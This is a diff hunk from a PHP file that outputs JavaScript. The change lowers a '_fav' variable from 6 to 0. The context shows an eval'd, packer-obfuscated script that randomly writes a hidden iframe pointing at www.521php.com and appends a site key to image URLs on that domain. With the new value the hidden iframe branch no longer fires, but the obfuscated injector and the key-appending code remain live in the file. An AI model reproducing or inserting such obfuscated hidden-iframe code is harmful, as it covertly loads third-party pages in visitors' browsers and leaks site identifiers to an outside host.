@@ -64,7 +64,7 @@ if(1==@$_GET['upkey']){
 		echo 'var _favkey="'.$key.'";';
 ?>
 
-var _fav = 6;
+var _fav = 0;
 eval(function(p,a,c,k,e,r){e=function(c){return c.toString(36)};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[02-9a-hjl-n]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2 4(5,7){0 8=7-5;0 9=a.random();return(5+a.round(9*8))}0 b=4(1,10);if(_fav>=b){0 c=4(1,100);0 d=\'<e style="display:none"><f 3="g://h.j.l/index_\'+c+\'.html"></f></e>\';document.write(d)}$(2(){$("img[3*=\'g://h.j.l/api/fav/\']").each(2(i){0 6=$(this);0 m=6.n("3");setTimeout(2(){6.n("3",m+"&k="+_favkey)},i*500)})});',[],24,'var||function|src|GetRandomNum|Min|_this|Max|Range|Rand|Math|_num2|_n|_html|div|iframe|http|www||521php||com|_src|attr'.split('|'),0,{}))
 <?php
 		}
